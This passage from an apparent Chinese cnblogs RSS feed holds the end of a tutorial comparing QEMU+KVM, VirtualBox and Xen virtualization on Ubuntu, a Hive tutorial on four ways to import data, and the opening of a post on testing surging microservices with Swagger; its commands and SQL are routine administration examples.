&lt;p&gt;用 man 命令查看一下它的文档，发现 qemu-kvm 包不仅包含的文件很少，而且它的可执行文件 kvm 也只是对 qemu-system-x86_64 命令的一个简单包装，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241100422056139.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那么问题来了，kvm 内核模块究竟是由哪个包提供的呢？其实，自从 Linux 2.6 开始，kvm 就已经被加入内核了。如果非要找出 kvm 内核模块 kvm.ko 是由哪个包提供的，可以用如下命令考察一下：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241104001271307.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;写到这里，已经可以看出 KVM 的使用是很简单的了。下面，我使用 KVM 运行一下上一篇中安装的 WinXP 操作系统，体验一下 QEMU 经过 KVM 加速后的运行效率。使用如下命令运行使用 KVM 加速的 QEMU：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/241823202214816.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看出，使用 KVM 加速后，虚拟机中的 WinXP 运行速度提升了不少，开机只用了 34 秒。我将分辨率调整为 1366*768，图形界面运行也很流畅，不管是打开 IE 浏览器还是 Office 办公软件都没有问题，再也没有出现 CPU 使用率飙升到 100% 的情况。如果用 &lt;code&gt;ps -ef | grep qemu&lt;/code&gt; 命令查看一下，发现 kvm 命令运行的还是 qemu-system-x86_64 程序，只不过加上了 -enable-kvm 参数，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/251944475648152.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;另外，对于桌面用户来说，有一个好用的图形化界面也是很重要的。虽然 QEMU 和 KVM 自身不带图形界面的虚拟机管理器，但是我们可以使用第 3 方软件，比如 virt-manager。只需要使用 &lt;code&gt;sudo apt-get install virt-manager&lt;/code&gt; 即可安装该软件。该软件依赖于 libvirt，在安装过程中也会自动安装。运行 virt-manager 的效果如下图，注意必须使用 sudo 运行，因为该软件需要超级用户权限：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/281554376899520.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;该软件可自动识别系统中的虚拟机环境是 QEMU+KVM 还是 Xen。新建一个虚拟机，由于之前安装过一个 WinXP 系统，所以选择导入现有硬盘镜像。点下一步后，出现如下界面：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/281557435969524.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这一步没什么好说的，再点下一步，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/281558505801761.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这里可以设置网络选项。如果勾选“在安装前自定义配置”的话，还可以对硬件进行进一步的自定义，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/281600359245111.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;在上图中，我们可以看到虚拟机支持的所有虚拟显卡的类型，在这里，我当然选择的是 VMVGA，因为我以前经常用 VMWare，知道这些操作系统在 VMWare 的虚拟显卡设置下运行得都没有问题。当然，其它的选项都可以试一下，不过在虚拟的操作系统中需要安装相应的驱动程序。&lt;/p&gt;
&lt;p&gt;最后，虚拟机运行的效果图如下：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog/16576/201502/281604575802573.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到，该程序提供的界面有非常丰富的功能菜单，功能是非常强大的，甚至可以向虚拟机中的操作系统发送组合按键。&lt;/p&gt;
&lt;p&gt;可以这么说，如果没有 VirtualBox 的话，QEMU+KVM 的组合应该是桌面用户的首选。&lt;/p&gt;
&lt;h2 id=&quot;virtualbox-性能强大的经典架构&quot;&gt;VirtualBox —— 性能强大的经典架构&lt;/h2&gt;
&lt;p&gt;VirtualBox 号称是目前开源界最强大的虚拟机产品，在 Linux 平台上，基本上都被大家选择为首选的虚拟机软件。VirtualBox 的强大不是盖的，毕竟其后台是超有钱的 Oracle 公司。VirtualBox 的任性也不是盖的，它硬是没有使用我前文所述的那些 qemu、kvm、libvirt 等被各个虚拟机使用的开源组件，它的前端、后端以及内核加速模块都是自己开发的，唯有远程桌面所需要的 VNC 大约使用了 libvncserver。&lt;/p&gt;
&lt;p&gt;我在标题中说到 VirutalBox 是使用的经典架构。所谓经典，主要体现在以下几个方面：&lt;/p&gt;
&lt;p&gt;1.虚拟机及虚拟机中的系统（Guest System）仍运行于主操作系统（Host System）之上，只是通过主操作系统的内核模块进行加速；&lt;/p&gt;
&lt;p&gt;2.Unix 系统中 Front-End 模式的经典架构，在 VirtualBox 中，VirtualBox 的图形界面只不过是命令行界面的虚拟机软件 VBoxManage 的图形包装而已，同时，它还提供 VBoxSDL、VBoxHeadless 等命令行工具。VBoxHeadless 就可以运行一个不显示虚拟机桌面的虚拟机，如果要显示桌面，可以运行一个远程桌面连接它。前后端分离有一个好处，就是对于桌面用户，可以使用前端的图形界面简化操作，而对于企业级用户，可以使用命令行工具构建自动化脚本，甚至在系统启动时自动运行虚拟机。&lt;/p&gt;
&lt;p&gt;我并不是一开始就喜欢上 VirtualBox 的，一点小小的插曲差点就让我错过了这么好的虚拟机软件。本来我刚开始看到在各个 Linux 论坛都将 VirtualBox 放到首位，而不是在新闻中铺天盖地的 KVM、Xen，我就觉得 VirutalBox 可能有点不够专业，再加上第一次使用 VirtualBox 时，发现它不能完美转发 Ctrl+Alt+Fx（x=1～12），发现它的有些配置不能完全在图形界面中设置，需要手动更改配置文件，然后我就放弃了。直到我掌握的正确的折腾 Linux 的方法论，看完了它长达 369 页的用户手册，我才真正了解了它的强大，并深深爱上了它。VirtualBox 把右边的 Ctrl 定义为 Host 键，要向客户机发送 Ctrl+Alt+Fx，只需要按 Host+Fx 就行了。&lt;/p&gt;
&lt;p&gt;首先，在 Ubuntu 中安装 VirutalBox 是非常容易的，只需要一个 &lt;code&gt;sudo apt-get install virtualbox&lt;/code&gt; 即可。&lt;/p&gt;
&lt;p&gt;安装完 VirtualBox 后，可以考察一下它所遵守的我之前提到的“经典架构”，命令和运行结果如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032118509104007.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;lsmod 命令可以看到 VirtualBox 安装后，在主操作系统中安装了好几个内核模块，用来对虚拟机进行加速。至于使用内核模块对虚拟机加速的图片我这里就不再贴了，请大家参考我的上一篇。通过 dpkg -L 命令可以考察 VirtualBox 提供了哪些命令行工具。最后，通过 dpkg -S 命令可以看到，VirtualBox这个可执行程序其实是属于 virtualbox-qt 软件包的，它只是一个图形界面的封装。&lt;/p&gt;
&lt;p&gt;启动 VirtualBox，新建虚拟机和安装操作系统的过程我就不多说了，图形界面很强大，一步一步执行准没错。安装完 WinXP 后，运行效果如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032122199419481.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从该图中可以看出，WinXP 系统认出的 CPU 是准确的 Intel Core i7-4770K，虽然我只给它分配了两个核心。但是显卡不能准确识别。之所以是这样，是因为 WinXP 系统中没有相应的驱动，所以，需要安装 VirtualBox 的客户系统增强工具。在菜单栏选择安装增强功能，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032126133016322.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后 VirtualBox 就会给 WinXP 安装一个虚拟光盘，双击该光盘，就可以在 WinXP 系统中安装客户系统增强工具，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032128061298151.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;客户系统增强工具是安装在 Guest System 中的，可以认为客户系统增强工具主要是包含了客户操作系统中所需要驱动，因为没有这些驱动，客户操作系统可能无法认识那些虚拟出来的硬件，比如虚拟显卡什么的。当然，客户系统增强工具的功能远远不止这些，比如显卡 3D 加速啊、主操作系统和客户操作系统共享文件夹啊什么的，还有一个最牛 B 的，那就是让客户操作系统进入无缝模式。比如安装完用户增强工具后，可以识别出显卡类型，并且有不同的分辨率选项，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032133120987710.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;按 Host+L 键，可以键入无缝模式，如下图，可以看到在 Ubuntu 系统中，Ubuntu 风格的窗口和 WinXP 风格的窗口共存：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032134595821973.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再玩大一点，使用 IE 浏览器访问博客园，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032135507858663.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;由此可见，在 Linux 系统中使用 Windows 的软件进行办公不再是梦，什么网银、什么 QQ，一样毫无障碍。再按 Host+L 键，虚拟机会回到窗口模式。&lt;/p&gt;
&lt;p&gt;VirtualBox 功能非常强大，单凭我这一篇博文是不可能学会的。好在是我这一个系列一直都是秉承“授人以鱼不如授人以渔”的原则，一直都是指导折腾 Linux 系统的方法论，并贴图让没有亲自动手机会的人也对 Linux 系统有一个直观的感受，也一直指出从哪里可以找到相应的学习资料。用 dpkg -L 命令，就可以找出我前面提到的 VirtualBox 自带的长达369页的文档，使用 Ubuntu 自带的 evince 阅读器阅读之，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/032140082705801.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;当然，也可以从官网下载 &lt;a href=&quot;http://download.virtualbox.org/virtualbox/UserManual.pdf&quot;&gt;VirtualBox 官方文档 pdf 版&lt;/a&gt;，放到手机上有空的时候慢慢阅读。至于我前面说的 VirtualBox 这不能那不能什么的，完全都是我自己不切实际的瞎说，等你看完它的文档，你就会发现它没有什么是不能的。就 VirtualBox 在我机器上的运行效果看，流畅度要超过前面的 QEMU+KVM组合，图形性能也要更加强大。它的文档中还有更多更高级的玩法，仔细阅读吧，精通命令行和配置文件不是梦，而且 VirtualBox 并不仅仅适用于桌面用户，对于企业级的应用，它也是可以的。&lt;/p&gt;
&lt;h2 id=&quot;xen-令人脑洞大开的奇异架构&quot;&gt;Xen —— 令人脑洞大开的奇异架构&lt;/h2&gt;
&lt;p&gt;在虚拟机领域，Xen 具有非常高的知名度，其名字经常在各类文章中出现。同时 Xen 也具有非常高的难度，别说玩转，就算仅仅只是理解它，都不是那么容易。之所以如此，那是因为 Xen 采用了和我前面介绍的那几个虚拟机完全不同的架构。在这里，我称之为令人脑洞大开的奇异架构。&lt;/p&gt;
&lt;p&gt;在经典的虚拟机架构中，虚拟机软件运行于 Host System 之中，而 Guest System 运行于虚拟机软件之中。为了提高 Guest System 的运行速度，虚拟机软件一般会在 Host System 中使用内核模块开一个洞，将 Guest System 的运行指令直接映射到物理硬件上。但是在 Xen 中，则根本没有 Host System 的概念，传说它所有的虚拟机都直接运行于硬件之上，虚拟机运行的效率非常的高，虚拟机之间的隔离性非常的好。&lt;/p&gt;
&lt;p&gt;当然，传说只是传说。我刚开始也是很纳闷，怎么可能让所有的虚拟机都直接运行于硬件之上。后来我终于知道，这只是一个噱头。虚拟机和硬件之间，还是有一个管理层的，那就是 Xen Hypervisor，只不过这个管理层可以做得相当薄。当然 Xen Hypervisor 的功能毕竟是有限的，怎么样它也比不上一个操作系统，因此，在 Xen Hypervisor 上运行的虚拟机中，有一个虚拟机是具有特权的，它称之为 Domain 0，而其它的虚拟机都称之为 Domain U。&lt;/p&gt;
&lt;p&gt;Xen的架构如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/072047590864636.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;从图中可以看出，Xen 虚拟机架构中没有 Host System，在硬件层之上是薄薄的一层 Xen Hypervisor，在这之上就是各个虚拟机了，没有 Host System，只有 Domain 0，而 Guest System 都是 Domain U，不管是 Domain 0 还是 Domain U，都是虚拟机，都是被虚拟机软件管理的对象。&lt;/p&gt;
&lt;p&gt;既然 Domain 0 也是一个虚拟机，也是被管理的对象，所以可以给它分配很少的资源，然后将其余的资源公平地分配到其它的 Domain。但是很奇怪的是，所有的虚拟机管理软件其实都是运行在这个 Domain 0 中的。同时，如果要连接到其它 Guest System 的控制台，而又不是使用远程桌面（VNC）的话，这些控制台也是显示在 Domian 0 中的。所以说，这是一个奇异的架构，是一个让人很不容易理解的架构。&lt;/p&gt;
&lt;p&gt;这种架构桌面用户不喜欢，因为 Host System 变成了 Domain 0，本来应该掌控所有资源的主操作系统变成了一个受管理的虚拟机，本来用来打游戏、编程、聊天的主战场受到限制了，可能不能完全发挥硬件的性能了，还有可能运行不稳定了，自然会心里不爽。（Domain 0确实不能安装专用显卡驱动，确实会运行不稳定，这个后面会讲。）但是企业级用户喜欢，因为所有的 Domain 都是虚拟机，所以可以更加公平地分配资源，而且由于 Domain U 不再是运行于 Domian 0 里面的软件，而是和 Domain 0 平级的系统，这样即使 Domain 0 崩溃了，也不会影响到正在运行的 Domain U。（真的不会有丝毫影响吗？我表示怀疑。）&lt;/p&gt;
&lt;p&gt;下面开始在 Ubuntu 系统中体验 Xen。使用如下命令可以在 Ubuntu 的软件源中搜索和 Xen 相关的软件包以及安装 Xen Hypervisor：&lt;/p&gt;
&lt;pre class=&quot;bash&quot;&gt;
&lt;code&gt;sudo aptitude search xen
sudo aptitude install xen-hypervisor-4.4-amd64&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;传说在旧版本的 Xen Hypervisor 上只能运行经过修改过的 Linux 内核。但是在目前的版本中不存在该问题。我机器上的 Ubuntu 14.10 系统不经任何修改，就可以当成 Domain 0 中的系统运行。至于是否让该系统运行于 Xen Hypervisor 上，在启动时可以选择，如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/072048177587106.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;通过查看 Grub 的配置文件，可以看到通过 Xen 虚拟机启动 Ubuntu 系统时，Grub 先启动的是 /boot/xen-4.4-amd64.gz，然后才把 Linux 内核以及 initrd 文件作为模块载入内存。也就是说，Grub 启动 Xen Hypervisor，然后 Xen Hypervisor 运行 Domian 0。&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/072048424778624.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;前面提到 Host System 一下子变成了 Domain 0 中的操作系统是让桌面用户比较不爽的事，这里详细论述。虽然说目前的 Xen 同时支持全虚拟化和半虚拟化，支持操作系统不经任何修改就运行于 Xen 虚拟机上（全虚拟），但是系统是否稳定还是和内核有很大关系的。比如说我在 Ubuntu 14.04 刚推出的那段时间，在 Ubuntu 14.04 中使用 Xen 是没有什么问题的，但是经过几次系统升级后，Xen 就出问题了，没办法成功进入 Domain 0 中的 Ubuntu 14.04。现在我用的是 Ubuntu 14.10，已经升过好几次级了，目前使用Xen还是很稳定的。其次就是显卡驱动的问题，我的 Ubuntu 当主系统用时，使用的是 NVIDIA 的显卡驱动，但是当 Ubuntu 运行于 Domain 0 中时，就不能使用 NVIDIA 的显卡驱动了，否则无法进入图形界面。&lt;/p&gt;
&lt;p&gt;下面来测试一下 Xen 虚拟机的运行效果。通过前文的探讨，可以看出一个虚拟机的运行需要两个要素：一是一套虚拟的硬件系统，二是一个包含了操作系统的磁盘镜像。QEMU 虚拟机关于硬件的配置全由命令行指定，VirtualBox 虚拟机的硬件配置存在于配置文件中，而 Xen 呢，它也存在于配置文件中，这个配置文件要我们自己写。至于磁盘镜像，还是复用我之前创建的那个 WinXP.img 吧，记住，它是 qcow2 格式的。&lt;/p&gt;
&lt;p&gt;先进入我主目录的 virtual-os 目录，ls 看一下，里面有我之前创建的 WinXP.img。然后，我们创建一个 WinXP_Xen.hvm 配置文件，其内容如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;builder = &quot;hvm&quot;
name = &quot;WinXP_Xen.hvm&quot;
memory = 2048
vcpus = 2
disk = [ '/home/youxia/virtual-os/WinXP.img, qcow2, hda, rw' ]
sdl = 1&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这段配置文件很简单，也很容易懂。 hvm 代表这是一个全虚拟化的虚拟机，和全虚拟化相对的是半虚拟化，半虚拟化只能运行经过修改的内核，但是可以获得更高的性能。为该虚拟机分配 2 个 CPU 和 2G 内存，并指定硬盘镜像文件。最后一个 sdl=1 表示使用 SDL 图形库显示虚拟操作系统的界面，如果不想用 SDL，也可以写成 vnc=1，这样需要使用 vncviewer 才能连接到虚拟机操作系统的桌面。&lt;/p&gt;
&lt;p&gt;至于 Xen 的配置文件怎么写，管理命令怎么用，这个必须得有学习资料。通过 &lt;code&gt;man xl&lt;/code&gt; 和 &lt;code&gt;man xl.cfg&lt;/code&gt; 查看手册页是可以的，但是最全面的资料还是在 &lt;a href=&quot;%5Bhttp://www.xenproject.org&quot;&gt;Xen 的官网&lt;/a&gt; 上。&lt;/p&gt;
&lt;p&gt;使用 &lt;code&gt;sudo xl list&lt;/code&gt; 命令可以看到系统中只有一个Domain 0在运行，然后使用 &lt;code&gt;sudo xl create -c WinXP_Xen.hvm&lt;/code&gt; 即可运行一个 Domian U 虚拟机，该虚拟机使用 WinXP_Xen.hvm 配置文件。 xl 命令的 -c 选项表示把 Domain U 的控制台显示在 Domain 0 中，如果不用 -c 选项而使用 -V 选项，则创建虚拟机后使用 vncviewer 进行连接。新建的虚拟机运行起来后，再次使用 &lt;code&gt;sudo xl lis&lt;/code&gt;t 命令，可以看到除了Domain 0，还多了一个名称为“WinXP_Xen.hvm”的虚拟机。运行效果如下图：&lt;br/&gt;&lt;img src=&quot;https://images0.cnblogs.com/blog2015/16576/201503/072049595397368.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;关于 Xen 更多更高级的功能，比如动态迁移什么的，我这里就不试了。至于说到 Xen 虚拟机的隔离性，如果一个 Domain U 崩溃了，肯定是不会影响到 Domain 0和其它 Domain U 的，但是如果 Domain 0 崩溃了，Domain U 真的不会受到任何影响吗？Domain 0 崩溃了怎么重启它呢？这都是我没想明白的问题。在折腾 Xen 的过程中，我曾多次重启过机器，重启后一看，WinXP_Xen.hvm 还在继续运行，似乎是没有受到 Domain 0 的影响，但是我就想，我机器都重启了，电源都断了，Domain U 它真的能丝毫不受影响吗？&lt;/p&gt;
&lt;p&gt;我觉得，Xen 虚拟机不应该是桌面用户的首选，因为它架构比较奇异不容易理解，可能因内核升级而出现不稳定，不能充分发挥桌面硬件的性能，如不能使用 Nvidia 的显卡；桌面用户还是应该首选 VirtualBox。企业及客户可以考虑 Xen，因为它可以提供较好的性能和隔离性，企业级用户不需要桌面用户那么多的功能，所以可以把 Domain 0 做到很薄，可以完全不要图形界面，也不用经常升级内核，甚至可以选择一个经过修改优化的内核，这样就可以在一套硬件上运行尽可能多的虚拟机。&lt;/p&gt;
&lt;p&gt;关于 Linux 下虚拟机相关的内容，就写到这里吧。欢迎大家批评指正。&lt;/p&gt;
&lt;h2 id=&quot;求打赏&quot;&gt;求打赏&lt;/h2&gt;
&lt;p&gt;我对这次写的这个系列要求是非常高的：首先内容要有意义、够充实，信息量要足够丰富；其次是每一个知识点要讲透彻，不能模棱两可含糊不清；最后是包含丰富的截图，让那些不想装 Linux 系统的朋友们也可以领略到 Linux 桌面的风采。如果我的努力得到大家的认可，可以扫下面的二维码打赏一下：&lt;br/&gt;&lt;img src=&quot;https://images2018.cnblogs.com/blog/16576/201808/16576-20180831154735325-1276475036.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;版权申明&quot;&gt;版权申明&lt;/h2&gt;
&lt;p&gt;该随笔由京山游侠在2018年10月08日发布于博客园，引用请注明出处，转载或出版请联系博主。QQ邮箱：1841079@qq.com&lt;/p&gt;
</description>
<pubDate>Sun, 07 Oct 2018 22:43:00 +0000</pubDate>
<dc:creator>京山游侠</dc:creator>
<og:description>特别说明： 要在我的随笔后写评论的小伙伴们请注意了，我的博客开启了 MathJax 数学公式支持，MathJax 使用 标记数学公式的开始和结束。如果某条评论中出现了两个 ，MathJax 会将两个</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/youxia/p/LinuxDesktop007.html</dc:identifier>
</item>
<item>
<title>一起学Hive——详解四种导入数据的方式 - summer哥</title>
<link>http://www.cnblogs.com/airnew/p/9752342.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/airnew/p/9752342.html</guid>
<description>&lt;p&gt;在使用Hive的过程中，导入数据是必不可少的步骤，不同的数据导入方式效率也不一样，本文总结Hive四种不同的数据导入方式：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;从本地文件系统导入数据&lt;/li&gt;
&lt;li&gt;从HDFS中导入数据&lt;/li&gt;
&lt;li&gt;从其他的Hive表中导入数据&lt;/li&gt;
&lt;li&gt;创建表的同时导入数据&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;使用导入数据时，会使用到into和overwrite into两个关键字，into是在当前表追加数据，而overwrite into是删除当前表的数据然后在导入数据。&lt;/p&gt;
&lt;h3 id=&quot;从本地系统导入数据&quot;&gt;从本地系统导入数据&lt;/h3&gt;
&lt;p&gt;在Hive中创建load_data_local表，该表中有两个字段，一个是name一个是age。创建表的SQL语句如下:&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;create table if not exists load_data_local(name string,age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在本地文件系统中创建一个load_data_local.txt的文件，然后往里面写入数据，数据之间用空格分隔。数据为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;zhangsan 30
lisi 50
wangwu 60
peiqi 6&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行&lt;code&gt;load data local inpath '/home/hadoop/hive_test/load_data_local.txt' into table load_data_local;&lt;/code&gt;命令，即可将本地系统中的文件的数据导入到Hive表中。&lt;/p&gt;
&lt;p&gt;在使用从本地系统导入数据大Hive表中时，文件的路径必须使用绝对路径。&lt;/p&gt;
&lt;p&gt;有两种方式验证数据是否导入成功，一种是在Hive中执行&lt;code&gt;select * from load_data_local。&lt;/code&gt;另外一种是查看hdfs文件系统中的load_data_local目录下面是否有刚刚上传的load_data_local.txt文件，查看命令为：&lt;code&gt;hadoop fs -ls /user/hive/warehouse/bigdata17.db/load_data_local&lt;/code&gt;，结果为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;18/10/07 02:37:11 WARN util.NativeCodeLoader: Unable to load native-hadoop library for your platform... using builtin-java classes where applicable
Found 1 items
-rwxr-xr-x   3 root supergroup         38 2018-10-07 02:24 /user/hive/warehouse/bigdata17.db/load_data_local/load_data_local.txt&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;从hdfs中导入数据&quot;&gt;从HDFS中导入数据&lt;/h3&gt;
&lt;p&gt;在Hive中创建load_data_hdfs表，表中有两个字段，分别是name和age。创建表的SQL如下：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;create table if not exists load_data_hdfs(name string,age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在本地文件系统创建文件load_data_hdfs.txt文件，然后往里面写入数据。&lt;/p&gt;
&lt;p&gt;将load_data_hdfs.txt文件上传到HDFS的data目录下面，命令为：&lt;code&gt;hadoop fs -put load_data_hdfs.txt /data&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在Hive中执行命令：&lt;br/&gt;&lt;code&gt;load data inpath 'data/load_data_hdfs.txt' into table load_data_hdfs;&lt;/code&gt;&lt;br/&gt;即可将数据导入到Hive的load_data_hdfs表中。&lt;br/&gt;从本地系统导入数据和从hdfs文件系统导入数据用的命令都是load data，但是从本地系统导入数据要加local关键字，如果不加则是从hdfs文件系统导入数据。&lt;/p&gt;
&lt;p&gt;从hdfs文件系统导入数据成功后，会把hdfs文件系统中的load_data_hdfs.txt文件删除掉。&lt;/p&gt;
&lt;h3 id=&quot;从其他的hive表中导入数据&quot;&gt;从其他的Hive表中导入数据&lt;/h3&gt;
&lt;p&gt;这种方式要求目标表和源表都必须存在。&lt;br/&gt;创建一个要导入数据的目标表，SQL如下：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;create table if not exists load_data_local2(name string,age int) 
row format delimited fields terminated by ' '  
lines terminated by '\n';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;导入数据的SQL：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;insert into table load_data_local2 select * from load_data_local;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这种数据导入方式也适用于分区表和分桶表的情况。本文只介绍导入分区表的情况，导入数据到分区表分为静态分区和动态分区两种方式。&lt;/p&gt;
&lt;p&gt;我们先创建一个分区表，SQL如下：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;create table if not exists load_data_partition(name string)  
partitioned by(age int)  
row format delimited fields terminated by ' '  
lines terminated by '\n';&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;将数据导入分区表必须先在Hive中执行下面两句语句：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;set hive.exec.dynamic.partition=true;
set hive.exec.dynamic.partition.mode=nonstrict;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;静态方式将load_data_local表的数据导入到load_data_partition表的sql语句如下：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;insert into table load_data_partition partition(age=25) select name from load_data_local;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这种方式必须显示的指定分区值，如果分区有很多值，则必须执行多条SQL，效率低下。&lt;/p&gt;
&lt;p&gt;动态方式将load_data_local表的数据导入到load_data_partition表的sql语句如下：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;insert overwrite table load_data_partition partition select name,age from load_data_local;&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这种方式要注意目标表的字段必须和select查询语句字段的顺序和类型一致，特别是分区字段的类型要一致，否则会报错。&lt;/p&gt;
&lt;p&gt;一张表有两个以上的分区字段，如果同时使用静态分区和动态分区导入数据，静态分区字段必须写在动态分区字段之前。&lt;/p&gt;
&lt;p&gt;Hive还支持一条SQL语句中将数据插入多个表的功能，只需将from关键字前置即可：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;from load_data_local 
insert overwrite table load_data_partition partition (age)
  select name,age
insert overwrite table load_data_local3 
  select *&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的sql语句同时插入到表load_data_partition和load_data_local3表中。这种方式非常高效，对于大数据量并且要将数据插入到多个表的情况下，建议用这种方式。&lt;/p&gt;
&lt;h3 id=&quot;创建表的同时导入数据&quot;&gt;创建表的同时导入数据&lt;/h3&gt;
&lt;p&gt;这种方式的创建表的表结构来自于select查询语句的查询字段。&lt;/p&gt;
&lt;p&gt;创建load_data_local3并将load_data_loaca的数据导入到load_data_local3表中：&lt;/p&gt;
&lt;pre class=&quot;sql&quot;&gt;
&lt;code&gt;create table load_data_local3 as select * from load_data_local;&lt;/code&gt;
&lt;/pre&gt;</description>
<pubDate>Sun, 07 Oct 2018 22:29:00 +0000</pubDate>
<dc:creator>summer哥</dc:creator>
<og:description>在使用Hive的过程中，导入数据是必不可少的步骤，不同的数据导入方式效率也不一样，本文总结Hive四种不同的数据导入方式： 从本地文件系统导入数据 从HDFS中导入数据 从其他的Hive表中导入数据</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/airnew/p/9752342.html</dc:identifier>
</item>
<item>
<title>surging如何使用swagger 组件测试业务模块 - fanly11</title>
<link>http://www.cnblogs.com/fanliang11/p/9751908.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/fanliang11/p/9751908.html</guid>
<description>&lt;p align=&quot;left&quot;&gt;&lt;span&gt;   微服务架构概念的提出已经有非常长一段时间了，但在近期几年却开始频繁地出现，大家都着手升级成微服务架构，使用着各种技术，大家认为框架有服务治理就是微服务，实现单一协议的服务调用，微服务虽然没有太明确的定义，但是我认为服务应该是一个或者一组相对较小且独立的功能单元，可以自由组合拆分，针对于业务模块的 CRUD 可以注册为服务，而每个服务都是高度自治的，从开发，部署都是独立，而每个服务只做单一功能，利用领域驱动设计去更好的拆分成粒度更小的模块，而框架本身提供了多种协议，如ws,tcp,http,mqtt,rtp,rtcp, 并且有各种功能的中间件，所开发的业务模块，通过框架可以适用于各种业务场景，让开发人员专注于业务开发这才是真正意义上的微服务。&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt; 以上只是谈下微服务，避免一些人走向误区。而这篇文章主要介绍下surging如何使用swagger 组件测试业务模块&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p align=&quot;left&quot;&gt;&lt;span&gt;&lt;a href=&quot;https://github.com/dotnetcore/surging&quot; target=&quot;_blank&quot;&gt;surging源码下载&lt;/a&gt;&lt;/span&gt;&lt;/p&gt;

&lt;h2&gt; &lt;/h2&gt;
&lt;p&gt;surging 集成了Kestrel组件并且扩展swagger组件，以下介绍下如何使用swagger组件&lt;/p&gt;
